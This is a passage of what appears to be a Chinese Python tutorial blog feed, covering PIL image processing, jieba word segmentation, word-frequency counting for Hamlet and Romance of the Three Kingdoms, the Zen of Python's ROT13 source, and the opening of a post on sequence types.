RGB</code></pre><p>拓展：CMYK色彩是彩色印刷时采用的一套色彩体系，也称印刷四色。</p><p>（7）Image还能读取序列类图像文件，包括GIF、FLI、FLC、TIFF等格式文件。open()方法打开一个图像是自动加载序列中的第一帧，使用seek()和tell()可以在不同帧之间移动。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Image.seek(frame)</td><td>跳转并返回图像指定的帧</td></tr><tr><td>Image.tell()</td><td>返回当前帧的序号</td></tr></tbody></table><p>（8）GIF文件图像提取：对一个GIF格式动态文件，提取其中的各帧图像，并保存为文件。</p><pre><code class="python">from PIL import Imageim = Image.open(&#39;pybit.gif&#39;)    # 读入一个GIF文件try:    im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))#&#123;:02d&#125;表示两个宽度的十进制显示，不够两位用0填充。    while True:        im.seek(im.tell()+1)        im.save(&#39;picframe&#123;:02d&#125;.png&#39;.format(im.tell()))except:    print(&quot;处理结束&quot;)</code></pre><p>（9）Image类的图像转换和保存方法如下表所示。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Image.save(filename, format)</td><td>将文件保存为filename文件名，format是图片格式</td></tr><tr><td>Image.convert(mode)</td><td>使用不同的参数，转换图像为新的模式</td></tr><tr><td>Image.thumbnail(size)</td><td>创建图形的缩略图，size是缩略图尺寸的二元元组</td></tr></tbody></table><p>（10）若调用save()时不指定保存格式，PIL将自动根据filename的后缀名存储图像，例如上例提取GIF图像的.png；若指定了格式，则按照格式存储。</p><p>（11）搭配采用open()和save()方法可以实现图像的格式转换，例如，将jpg格式转换为png格式。</p><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; im = Image.open(&quot;3.jpg&quot;)    &gt;&gt;&gt; im.save(&quot;3.png&quot;)    #save()方法主要用于将文件保存到硬盘，原有的3.jpg文件依然存在。PIL库还提供了更加强大的格式转换方式。</code></pre><p>（12）生成3.jpg的缩略图，代码如下：</p><pre><code class="python">&gt;&gt;&gt; im.thumbnail((128,128))   #(128,128)是缩略图的尺寸&gt;&gt;&gt; im.save(&quot;3TN&quot;,&quot;JPEG&quot;)</code></pre><p>（13）Image类可以缩放和旋转图像，方法如下表所示：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Image.resize(size)</td><td>按size大小调整图像，生成副本</td></tr><tr><td>Image.rotate(angle)</td><td>以逆时针旋转的角度值angle作为参数来旋转图像，生成副本</td></tr></tbody></table><p>（14）Image类能够对每个像素点或者一幅RGB图像的每个通道单独进行操作，如下表所示</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>Image.point(func)</td><td>根据函数func的功能对每个元素进行运算，返回图像副本</td></tr><tr><td>Image.split()</td><td>提取RGB图像的每个颜色通道，返回图像副本</td></tr><tr><td>Image.merge(mode,bands)</td><td>合并通道，其中mode表示色彩，bands表示新的色彩通道，再合成一幅新的图像</td></tr><tr><td>Image.blend(im1,im2,alpha)</td><td>将两幅图片im1和im2按照如下公式插值后生成新的图像:im1*(1.0-alpha)+im2*alpha</td></tr></tbody></table><p>（15）图像的颜色交换，通过分离RGB图片的3个颜色通道实现颜色交换。代码如下：</p><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; im = Image.open(&#39;01.jpg&#39;)&gt;&gt;&gt; r, g, b = im.split()&gt;&gt;&gt; om = Image.merge(&quot;RGB&quot;, (b, g, r))&gt;&gt;&gt; om.save(&#39;001.jpg&#39;)&gt;&gt;&gt; exit()</code></pre><p><img src="https://i.loli.net/2021/03/31/PaSwA1Mckibyz4g.png" alt="image-20210331122318860"></p><p><img src="https://i.loli.net/2021/03/31/FV3oAvJiQLw4brY.png" alt="image-20210331122508093"></p><p>（16）操作图像的每个像素点需要通过函数实现，可以采用lambda函数和point()方法。</p><pre><code class="python">&gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; im = Image.open(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01.jpg&#39;)&gt;&gt;&gt; r,g,b = im.split()&gt;&gt;&gt; newg = g.point(lambda i:i*0.9)&gt;&gt;&gt; newb = b.point(lambda i:i&lt;100)&gt;&gt;&gt; om = Image.merge(im.mode,(r,newg,newb))&gt;&gt;&gt; om.save(&#39;/media/fafusr/28AC2EBFAC2E8780/Python/program/第七章/01merge.jpg&#39;)</code></pre><p><img src="https://i.loli.net/2021/03/31/MKAFULqrbl5BaE3.png" alt="image-20210331123014245"></p><h3 id="图像的过滤和增强"><a href="#图像的过滤和增强" class="headerlink" title="图像的过滤和增强"></a>图像的过滤和增强</h3><p>（1）PIL库的ImageFilter类和ImageEnhance类提供了过滤图像和增强图像的方法。ImageFilter类提供了10种预定义图像过滤方法。如下表所示：</p><table><thead><tr><th>方法表示</th><th>描述</th></tr></thead><tbody><tr><td>ImageFilter.BLUR</td><td>图像的模糊效果</td></tr><tr><td>ImageFilter.CONTOUR</td><td>图像的轮廓效果</td></tr><tr><td>ImageFilter.DETAIL</td><td>图像的细节效果</td></tr><tr><td>ImageFilter.EDGE_ENHANCE</td><td>图像的边界加强效果</td></tr><tr><td>ImageFilter.EDGE_ENHANCE_MORE</td><td>图像的阀值边界效果加强</td></tr><tr><td>ImageFilter.EMBOSS</td><td>图像的浮雕效果</td></tr><tr><td>ImageFilter.FIND_EDGES</td><td>图像的边界效果</td></tr><tr><td>ImageFilter.SMOOTH</td><td>图像的平滑效果</td></tr><tr><td>ImageFilter.SMOOTH_MORE</td><td>图像的阀值平滑效果</td></tr><tr><td>ImageFilter.SHARPEN</td><td>图像的锐化效果</td></tr></tbody></table><p>（2）利用Image类的filter()方法可以使用ImageFilter类，使用方式如下：</p><pre><code class="python">Image.filter(ImageFilter.fuction)</code></pre><p>（3）图像轮廓获取。</p><pre><code class="python">from PIL import Imagefrom PIL import ImageFilterim = Image.open(&quot;01.jpg&quot;)om = im.filter(ImageFilter.CONTOUR)om.save(&quot;01Contour.jpg&quot;)</code></pre><p><img src="https://i.loli.net/2021/03/31/SBdyCt7V1rULe39.png" alt="image-20210331194927169"></p><p>（4）ImageEnhance类提供了更高级的图像增强功能，如调整色彩度、亮度、对比度、锐化等。如下表所示。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>ImageEnhance.enhance(factor)</td><td>对选择属性的数值增强factor倍</td></tr><tr><td>ImageEnhance.Color(im)</td><td>调整图像的颜色平衡</td></tr><tr><td>ImageEnhance.Contrast(im)</td><td>调整图像的对比度</td></tr><tr><td>ImageEnhance.Brightness(im)</td><td>调整图像的亮度</td></tr><tr><td>ImageEnhance.Sharpness(im)</td><td>调整图像的锐度</td></tr></tbody></table><p>（5）图像的对比度增强</p><pre><code class="python">from PIL import Imagefrom PIL import ImageEnhanceim = Image.open(&quot;01.jpg&quot;)om = ImageEnhance.Contrast(im)om.enhance(20).save(&#39;01Contrast.jpg&#39;)</code></pre><p><img src="https://i.loli.net/2021/03/31/YmFkhMqzOUdygJ1.png" alt="image-20210331200703081"></p><h3 id="图像的字符画绘制"><a href="#图像的字符画绘制" class="headerlink" title="图像的字符画绘制"></a>图像的字符画绘制</h3><p>（1）位图图片是由不同颜色像素点组成的规则分布，如果采用字符串代替像素，图像就成为了字符画。</p><p>（2）首先定义一个字符集，将这个字符集代替图像中的像素点，使得每个字符对应图像中的不同颜色。字符的种类越多则越能还原图像的色彩变化，图片也更加富有层次感。</p><pre><code class="python">ascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&#39;&quot;)</code></pre><p>（3）图像的色彩信息无法被黑白ASCII字符直接模拟，可以使用灰度值将彩色图像转换为高质量的黑白文稿。灰度值指黑白图像中的颜色深度，<strong>白色为255,黑色为0</strong>。</p><p>（4）这里定义，灰度值从大到小依次使用字符集中从左到右的符号，因此，可以直接求出不同灰度值在字符集中对应的字符编号。</p><p>（5）定义色彩向灰度转换的公式如下，其中**R、G、B分别是像素点的RGB颜色值：</p><pre><code class="python">Gray = R * 0.2126 + G * 0.7152 + B * 0.0722</code></pre><p>像素的RGB颜色值与字符集的对应函数如下：</p><pre><code class="python">def get_char(r, b, g, alpha=256):    if alpha == 0:        return &#39; &#39;    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)    unit = 256 / len(ascii_char)    return ascii_char[gray//unit]</code></pre><p>（6）为使生成的字符画有最佳效果，可利用PIL库中的Image类的resize(size)函数对图片重新设定大小size。size是一个二元元组，分别表示<strong>新图像的长度和宽度。</strong>resize()函数不是简单地改变图像的大小，而是对像素在新尺寸下重新排列。</p><p>（7）创建一个空字符串txt，然后利用一个嵌套循环向里面添加字符。<strong>im.getpixel()方法可以返回给定图像位置的像素值。</strong>若图像为多通道，则返回一个RGB颜色元组。</p><p>（8）@#￥这类字符有浓密的色彩感，而_!{}/|这类字符空白较多，适合表示浅色。生成字符画后可根据字符集和图像的对照适当修改字符排列顺序。如将背景色对应的字符修改为_或/，将浓墨重彩的地方使用@*或B&amp;表示会更有层次感。</p><pre><code class="python">from PIL import Imageascii_char = list(&quot;$@B%8&amp;WM#*oahkbdpqwmZO0QLCJUYXzcvunxrjf/1234568795t\/|()1&#123;&#125;[]?-_+~&lt;&gt;i!;:,\^`.&quot;)def get_char(r, b, g, alpha=256):    if alpha == 0:        return &#39; &#39;    gray = int(0.2126 * r + 0.7152 * g + 0.0722 * b)    x = int((gray / (alpha + 1.0)) * len(ascii_char))    return ascii_char[x]def main():    im = Image.open(&quot;3.jpg&quot;)    width, height = 100, 60    im = im.resize((width,height))    txt = &quot;&quot;    for i in range(height):        for j in range(width):            txt += get_char(*im.getpixel((j,i)))        txt += &#39;\n&#39;    fo = open(&quot;pic_char.txt&quot;,&quot;w&quot;)    fo.write(txt)    fo.close()main()</code></pre><p>扩展：位图图像和矢量图</p><ul><li>位图亦称为点阵图像，由像素阵列组成。放大时会失真，但却能表达色彩丰富的图像效果。</li><li>矢量图使用直线和曲线来描述图形，复杂图形是通过数学公式计算获得的。放大、缩小或旋转时不失真，但难以表现色彩层次丰富的图像效果。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(八)-组合数据类型02</title>
      <link href="2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/"/>
      <url>2021/03/25/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%85%AB)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B02/</url>
      
        <content type="html"><![CDATA[<h2 id="jieba库的使用"><a href="#jieba库的使用" class="headerlink" title="jieba库的使用"></a>jieba库的使用</h2><h3 id="jieba概述"><a href="#jieba概述" class="headerlink" title="jieba概述"></a>jieba概述</h3><p>（1）对于一段英文文本，若要提取其中的单词，只需使用<strong>字符串处理的split()方法</strong>即可。例如：</p><pre><code class="python">&gt;&gt;&gt; &quot;China is a great country&quot;.split()#split通过指定分隔符对字符串进行分片，默认以空格进行分片。[&#39;China&#39;, &#39;is&#39;, &#39;a&#39;, &#39;great&#39;, &#39;country&#39;]&gt;&gt;&gt;print str.split(&#39; &#39;, 1 ); # 以空格为分隔符，分隔成两个(num+1)子字符串</code></pre><p>（2）对于一段中文文本，若要提取其中的单词则会缺少分隔符，因此需要引入jieba库。<strong>jieba（“结巴”）是Python中一个重要的第三方中文分词函数库，</strong>例如：</p><pre><code class="python">&gt;&gt;&gt;import jieba&gt;&gt;&gt;jieba.lcut(&quot;中国是一个伟大的国家&quot;)[&#39;中国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]</code></pre><p>（3）jieba是第三方库，不是Python安装包自带的，因此需要通过pip指令安装，pip安装命令如下：</p><pre><code>:\&gt;pip install jieba #或者 pip3 install jieba</code></pre><p>（4）jieba库的分词原理是利用一个中文词库，将待分词的内容与分词词库进行比对，通过图结构和动态规划方法找到最大概率的词组。除了分词，<strong>jieba还提供增加自定义中文单词的功能。</strong></p><p>（5）jieba库支持3种分词模式：</p><ul><li>精确模式，将句子最精确地切开，适合文本分析。</li><li>全模式，把句子中所有可以成词的词语都扫描出来，速度很快，但不能消除歧义。</li><li>搜索引擎模式，在精确模式的基础上，对长词再次切分，提高召回率，适用于搜索引擎分词。 </li></ul><h3 id="jieba库解析"><a href="#jieba库解析" class="headerlink" title="jieba库解析"></a>jieba库解析</h3><p>（1）jieba库主要提供分词功能，可以辅助自定义分词词典。jieba库中包含的主要函数如下表所示：</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">jieba.cut(s)</td><td align="center">精确模式，返回一可迭代的数据类型</td></tr><tr><td align="center">jieba.cut(s,cut_all=True)</td><td align="center">全模式，输出文本s中所有可能的单词</td></tr><tr><td align="center">jieba.cut_for_search(s)</td><td align="center">搜索引擎模式，适合搜索引擎建立索引的分词结果</td></tr><tr><td align="center"><strong>jieba.lcut(s)</strong></td><td align="center"><strong>精确模式，返回一个列表类型，建议使用</strong></td></tr><tr><td align="center"><strong>jieba.lcut(s,cut_all=True)</strong></td><td align="center"><strong>全模式，返回一个列表类型，建议使用</strong></td></tr><tr><td align="center"><strong>jieba.lcut_for_search(s)</strong></td><td align="center"><strong>搜素引擎模式，返回一个列表类型，建议使用</strong></td></tr><tr><td align="center">jieba.add_word(w)</td><td align="center">向分词词典中增加新词w</td></tr></tbody></table><p>（2）针对上述分词函数，举例如下：</p><pre><code class="python">&gt;&gt;&gt; jieba.lcut(&quot;中华人民共和国是一个伟大的国家&quot;)[&#39;中华人民共和国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]&gt;&gt;&gt; jieba.lcut(&quot;中华人民共和国是一个伟大的国家&quot;, cut_all=True)[&#39;中华&#39;, &#39;中华人民&#39;, &#39;中华人民共和国&#39;, &#39;华人&#39;, &#39;人民&#39;, &#39;人民共和国&#39;, &#39;共和&#39;, &#39;共和国&#39;, &#39;国是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]&gt;&gt;&gt; jieba.lcut_for_search(&quot;中华人民共和国是一个伟大的国家&quot;)[&#39;中华&#39;, &#39;华人&#39;, &#39;人民&#39;, &#39;共和&#39;, &#39;共和国&#39;, &#39;中华人民共和国&#39;, &#39;是&#39;, &#39;一个&#39;, &#39;伟大&#39;, &#39;的&#39;, &#39;国家&#39;]</code></pre><p>（3）jieba.lcut()函数返回精确模式，<strong>输出的分词能够完整且不多余地组成原始文本；</strong>jieba.lcut(,True)函数返回全模式，<strong>输出原始文本中可能产生的所有问题，冗余性最大；</strong>jieba.lcut_for_search()函数返回搜索引擎模式，<strong>该模式首先执行精确模式，然后再对其中的长词进一步切分获得结果。</strong></p><p>（4）默认情况下，上述表格中的6个分词函数可以较高概率识别自定义的新词，例如名字或缩写。而对于无法识别的分词，也可以通过jieba.add_word()函数向分词库添加，例如：</p><pre><code class="python">&gt;&gt;&gt; jieba.lcut(&quot;嵩天老师在努力教学Python语言&quot;)[&#39;嵩天&#39;, &#39;老师&#39;, &#39;在&#39;, &#39;努力&#39;, &#39;教学&#39;, &#39;Python&#39;, &#39;语言&#39;]&gt;&gt;&gt; jieba.lcut(&quot;习大大期盼有更好的教育&quot;)[&#39;习&#39;, &#39;大大&#39;, &#39;期盼&#39;, &#39;有&#39;, &#39;更好&#39;, &#39;的&#39;, &#39;教育&#39;]&gt;&gt;&gt; jieba.add_word(&quot;习大大&quot;)&gt;&gt;&gt; jieba.lcut(&quot;习大大期盼有更好的教育&quot;)[&#39;习大大&#39;, &#39;期盼&#39;, &#39;有&#39;, &#39;更好&#39;, &#39;的&#39;, &#39;教育&#39;]</code></pre><p>拓展：<strong>第三方库</strong></p><ul><li>Python语言的第三方库指不在Python安装包中的函数库，也是非标准函数库，这类函数库一般由全球各领域专业人士结合专业特点和兴趣开发。</li><li>Python语言构建了一个开放和自由的生态环境，随着Python语言的发展，一些稳定的第三方库不断被加入标准库。</li></ul><h2 id="文本词频统计"><a href="#文本词频统计" class="headerlink" title="文本词频统计"></a>文本词频统计</h2><p>词频统计只是累加问题，可用字典来解决。以词语为键，计数器为值，构成&lt;单词&gt;:&lt;出现次数&gt;的键值对即可。</p><h3 id="Hamlet-《哈姆雷特》英文词频统计"><a href="#Hamlet-《哈姆雷特》英文词频统计" class="headerlink" title="Hamlet-《哈姆雷特》英文词频统计"></a>Hamlet-《哈姆雷特》英文词频统计</h3><p>（1）统计英文词频的第一步：<strong>分解并提取英文文章的单词。</strong>，同一个单词会存在大小写不同形式，但计数却不能区分大小写。假设Hamlet文本由变量txt表示，</p><ul><li><strong>可以通过txt.lower()函数将字母变成小写，</strong>排除原文大小写差异对词频统计的干扰。</li><li>英文单词的分隔可以是空格、标点符号或者特殊符号。<strong>可以将各特殊字符和标点符号使用txt.replace()方法替换成空格，再提取单词。</strong></li></ul><p>（2）统计词频的第二步：对每个单词进行计数。假设将单词保存在变量word中，使用一个字典类型counts={}，统计单词出现的次数可采用如下代码：</p><pre><code class="python">counts[word] = counts[word] + 1</code></pre><ul><li>当遇到一个新词时，单词没有出现在字典结构中，则需要再字典中新建键值对：</li></ul><pre><code class="python">counts[new_word] = 1</code></pre><ul><li>因此，无论词是否在字典中，加入字典counts中的处理逻辑可以统一表示如下：</li></ul><pre><code class="python">if word in counts:    counts[word] = counts[word] + 1else:    counts[word] = 1#或者，这个处理逻辑可以更简洁地表示如下代码：counts[word] = counts.get(word,0) + 1    #若word在counts中,则返回word对应的值，若word不再counts中，则默认返回0</code></pre><p>（3）统计词频的第三步：对单词的统计值从高到低进行排序，输出前20个高频单词，并格式化打印输出。由于字典类型没有顺序，需要将其转换为有顺序的列表类型，再使用<strong>sort()方法和lambda函数配合实现根据单词出现的次数对元素进行排序。</strong>最后输出排序前10位的单词。</p><pre><code class="python">items = list(counts.items())     #将字典转换为记录列表items.sort(key=lambda x:x[1], reverse=True)    #指定记录第2列排序 ，降序排序&#39;&#39;&#39;sort() 函数用于对原列表进行排序，如果指定参数，则使用比较函数指定的比较函数。list.sort( key=None, reverse=False)reverse = True 降序， reverse = False 升序（默认）。&#39;&#39;&#39;&#39;&#39;&#39;匿名函数&lt;函数名&gt; = lambda &lt;参数列表&gt;： &lt;表达式&gt;等价于：def &lt;函数名&gt;(&lt;参数列表&gt;)：   #return &lt;表达式&gt;&#39;&#39;&#39;</code></pre><ul><li>采用函数对获取和整理文本进行封装，以下是完整代码：</li></ul><pre><code class="python">def getText():    txt = open(&quot;hamlet.txt&quot;, &quot;r&quot;).read()    txt = txt.lower()    for ch in &#39;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#39;:        txt = txt.replace(ch, &quot; &quot;)  #将文本中的特殊字符替换为空格    return txthamletTxt = getText()words = hamletTxt.split()           #默认以空格对文本分片counts = &#123;&#125;for word in words:    counts[word] = counts.get(word,0) + 1items = list(counts.items())#print(items)items.sort(key=lambda x:x[1], reverse=True)for i in range(10):    word, count = items[i]    print(&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count)) #0代表word,&lt;表示向左对齐；1代表count,&gt;表示向右对齐，默认采用空格填充。#运行结果如下：the        1138and         965to          754of          669you         550i           542a           542my          514hamlet      462in          436</code></pre><ul><li>观察输出结果可知，高频单词大多数是冠词、代词、连接词等语法型词汇，并不能代表文章含义。因此，需要采用<strong>集合类型构建一个排除词汇库excludes</strong>，在输出结果中排除这个词汇库中的内容，具备这样功能程序的完整代码如下：</li></ul><pre><code class="python">excludes = &#123;&quot;the&quot;,&quot;and&quot;,&quot;of&quot;,&quot;you&quot;,&quot;a&quot;,&quot;i&quot;,&quot;my&quot;,&quot;in&quot;&#125;def getText():    txt = open(&quot;hamlet.txt&quot;, &quot;r&quot;).read()    txt = txt.lower()    for ch in &#39;!&quot;#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#39;:        txt = txt.replace(ch, &quot; &quot;)    return txthamletTxt = getText()words = hamletTxt.split()counts = &#123;&#125;for word in words:    counts[word] = counts.get(word,0) + 1for word in excludes:    del(counts[word])items = list(counts.items())items.sort(key=lambda x:x[1], reverse=True)#print(items)for i in range(10):    word, count = items[i]    print(&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))#运行结果如下：&gt;&gt;&gt;to          754hamlet      462it          416that        391is          340not         314lord        309his         296this        295but         269#可通过继续增加excludes中的内容，以排除更多的词汇。</code></pre><h3 id="《三国演义》人物出场统计"><a href="#《三国演义》人物出场统计" class="headerlink" title="《三国演义》人物出场统计"></a>《三国演义》人物出场统计</h3><p>（1）中文文章需要用到jieba库才能进行词频统计，代码如下：</p><pre><code class="python">import jiebatxt = open(&quot;三国演义.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;).read()words = jieba.lcut(txt)counts = &#123;&#125;for word in words:    if len(word) == 1 :        continue    else:        counts[word] = counts.get(word,0) + 1items = list(counts.items())items.sort(key = lambda x:x[1], reverse=True)for i in range(15):    word,count=items[i]    print (&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))#运行结果如下：&gt;&gt;&gt;曹操          939孔明          831将军          746却说          647玄德          570丞相          489关公          484二人          464不可          430荆州          413孔明曰         384玄德曰         383不能          381如此          375张飞          349</code></pre><ul><li>增加排除词库exclude</li></ul><pre><code class="python">import jiebaexcludes = &#123;&quot;将军&quot;,&quot;却说&quot;,&quot;荆州&quot;,&quot;二人&quot;,&quot;不可&quot;,&quot;不能&quot;,&quot;如此&quot;&#125;txt = open(&quot;三国演义.txt&quot;, &quot;r&quot;, encoding=&#39;utf-8&#39;).read()words = jieba.lcut(txt)counts = &#123;&#125;for word in words:    if len(word) == 1 :        continue    elif word==&quot;诸葛亮&quot; or word== &quot;孔明曰&quot;:        rword = &quot;孔明&quot;    elif word==&quot;关公&quot; or word==&quot;云长&quot;:        rword = &quot;关羽&quot;    elif word == &quot;玄德&quot; or word == &quot;玄德曰&quot;:        rword = &quot;刘备&quot;    elif word ==&quot;孟德&quot; or word == &quot;丞相&quot;:        rword = &quot;曹操&quot;    else:        rword = word    counts[rword] = counts.get(rword,0) + 1for word in excludes:    del(counts[word])items = list(counts.items())items.sort(key = lambda x:x[1], reverse=True)for i in range(5):    word,count=items[i]    print (&quot;&#123;0:&lt;10&#125;&#123;1:&gt;5&#125;&quot;.format(word,count))#运行结果&gt;&gt;&gt;曹操         1435孔明         1378刘备         1225关羽          753张飞          349</code></pre><h2 id="Python之禅"><a href="#Python之禅" class="headerlink" title="Python之禅"></a>Python之禅</h2><p>（1）Python编译器以函数库的形式内置了一个有趣的文件，被称为“Python之禅”（The Zen of Python）。当调用如下一行语句后，会出现一段有趣的结果。</p><pre><code class="python">import this#运行结果The Zen of Python, by Tim PetersBeautiful is better than ugly.Explicit is better than implicit.Simple is better than complex.Complex is better than complicated.Flat is better than nested.Sparse is better than dense.Readability counts.Special cases aren&#39;t special enough to break the rules.Although practicality beats purity.Errors should never pass silently.Unless explicitly silenced.In the face of ambiguity, refuse the temptation to guess.There should be one-- and preferably only one --obvious way to do it.Although that way may not be obvious at first unless you&#39;re Dutch.Now is better than never.Although never is often better than *right* now.If the implementation is hard to explain, it&#39;s a bad idea.If the implementation is easy to explain, it may be a good idea.Namespaces are one honking great idea -- let&#39;s do more of those!</code></pre><p>（2）在Python安装目录中找到Lib/this.py文件，该程序内容如下：</p><pre><code class="python">s = &quot;&quot;&quot;Gur Mra bs Clguba, ol Gvz CrgrefOrnhgvshy vf orggre guna htyl.Rkcyvpvg vf orggre guna vzcyvpvg.Fvzcyr vf orggre guna pbzcyrk.Pbzcyrk vf orggre guna pbzcyvpngrq.Syng vf orggre guna arfgrq.Fcnefr vf orggre guna qrafr.Ernqnovyvgl pbhagf.Fcrpvny pnfrf nera&#39;g fcrpvny rabhtu gb oernx gur ehyrf.Nygubhtu cenpgvpnyvgl orngf chevgl.Reebef fubhyq arire cnff fvyragyl.Hayrff rkcyvpvgyl fvyraprq.Va gur snpr bs nzovthvgl, ershfr gur grzcgngvba gb thrff.Gurer fubhyq or bar-- naq cersrenoyl bayl bar --boivbhf jnl gb qb vg.Nygubhtu gung jnl znl abg or boivbhf ng svefg hayrff lbh&#39;er Qhgpu.Abj vf orggre guna arire.Nygubhtu arire vf bsgra orggre guna *evtug* abj.Vs gur vzcyrzragngvba vf uneq gb rkcynva, vg&#39;f n onq vqrn.Vs gur vzcyrzragngvba vf rnfl gb rkcynva, vg znl or n tbbq vqrn.Anzrfcnprf ner bar ubaxvat terng vqrn -- yrg&#39;f qb zber bs gubfr!&quot;&quot;&quot;d = &#123;&#125;for c in (65, 97):    for i in range(26):        d[chr(i+c)] = chr((i+13) % 26 + c)print(&quot;&quot;.join([d.get(c, c) for c in s]))&#39;&#39;&#39;最后一行代码首先是一个循环for c in s，这个就是变量输入的字符串；然后d.get(c,c) for c in s，对于每一个c，从d里面获取对应的value；最后&quot;&quot;.join把上面的结果拼接成一个字符串。等价于如下：tmp = []for c in s:    tmp.append(d.get(c, c))print &quot;&quot;.join(tmp)&#39;&#39;&#39;</code></pre><p>（3)该程序从第1行到第21行是一个字符串s，但该字符串并非明文。将s转换成明文的代码是从23行到28行。</p><ul><li>第23行定义了一个空字典。</li><li>第26行对字典d填充了内容，这个填充<strong>将i+c对应的字符替换为(i+13)%26+c，即将编号循环增加了13。</strong></li><li>chr(65)代表字符’A’，chr(97)代表字符’a’，因此，第23到第26行建立了字母a到z和字母A到Z的一个13位循环移动的对应表。</li></ul><p>密文： A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>原文： N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</p><p>密文： a b c d e f g h i j k l m n o p q r s t u v w x y z</p><p>原文： n o p q r s t u v w x y z a b c d e f g h i j k l m </p><p>（4）该算法可看作是凯撒密码的一种扩展，相比凯撒密码，这个算法采用循环移动13个位置，直接好处是原文和密文之间的相互转换可以使用同一个程序。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(七)-组合数据类型01</title>
      <link href="2021/03/20/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%83)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/"/>
      <url>2021/03/20/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E4%B8%83)-%E7%BB%84%E5%90%88%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B01/</url>
      
        <content type="html"><![CDATA[<h2 id="组合数据类型概述"><a href="#组合数据类型概述" class="headerlink" title="组合数据类型概述"></a>组合数据类型概述</h2><p>要点：<strong>组合数据类型为多个同类型或不同类型数据提供单一表示。组合数据类型分3类：序列类型、集合类型和映射类型。</strong></p><p>（1）定义： 将多个数据有效组织起来并统一表示，这种能够表示多个数据的类型称为<strong>组合数据类型</strong>。不同于数字类型，例如整数、浮点数和复数类型，这些类型仅能表示一个数，这种表示单一数据的类型称为<strong>基本数据类型</strong>。</p><p>（2）序列类型是一个元素向量，元素之间存在<strong>先后关系</strong>，通过需要访问，元素之间不排他。</p><p>（3）集合类型是一个元素集合，元素之间<strong>无序</strong>，相同元素在集合中唯一存在。</p><p>（4）映射类型是”键-值“数据项的集合，**每个元素是一个键值对，表示为(key,value)**。</p><p><img src="https://i.loli.net/2021/03/20/hVPeXHUaN4W5Id8.png" alt="image-20210320204630710"></p><h3 id="序列类型"><a href="#序列类型" class="headerlink" title="序列类型"></a>序列类型</h3><p>（1）序列类型是一维元素向量，元素之间存在先后关系，通过序号访问。当需要访问序列中某个特定值时，只需要通过下标标出即可。</p><p>（2）由于元素之间存在顺序关系，所以<strong>序列中可以存在数值相同但位置不同的元素</strong>。序列类型支持成员关系操作符(in)、长度计算函数(len())、分片([])，元素本身也可以是序列类型。</p><p>（3）Python中比较重要的序列类型：字符串(str)、元组(tuple)、列表(list)。</p><ul><li>字符串可以看成是单一字符的有序组合，属于序列类型。同时，由于字符串类型十分常用且单一字符串只表达一个含义，因此也被看作是基本数据类型。</li><li>元组是包含0个或多个数据项的不可变序列类型，元组生成后是固定的，其中任何数据项不能被替换或删除。</li><li>列表是一个可以修改数据项的数据类型，使用也最灵活。</li></ul><p>（4）<strong>只要是序列类型，都可以使用相同的索引体系，即正向递增序号和反向递减序号。</strong>(详见初始Python语言(二)))</p><p>（5)序列类型有12个通用的操作符和函数</p><table><thead><tr><th align="center">操作符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">x in s</td><td align="center">若x是s的元素，返回True，否则返回False</td></tr><tr><td align="center">x not in s</td><td align="center">若x不是s的元素，返回True，否则返回False</td></tr><tr><td align="center">s + t</td><td align="center">连接s和t</td></tr><tr><td align="center">s<em>n或n\</em>s</td><td align="center">将序列s复制n次</td></tr><tr><td align="center">s[i]</td><td align="center">索引，返回序列的第i个元素</td></tr><tr><td align="center">s[i:j]</td><td align="center">分片，返回包含序列s第i到j个元素的子序列（不包含第j个元素）</td></tr><tr><td align="center">s[i:j:k]</td><td align="center">步骤分片，返回包含序列s第i到j个元素以k为步数的子序列</td></tr><tr><td 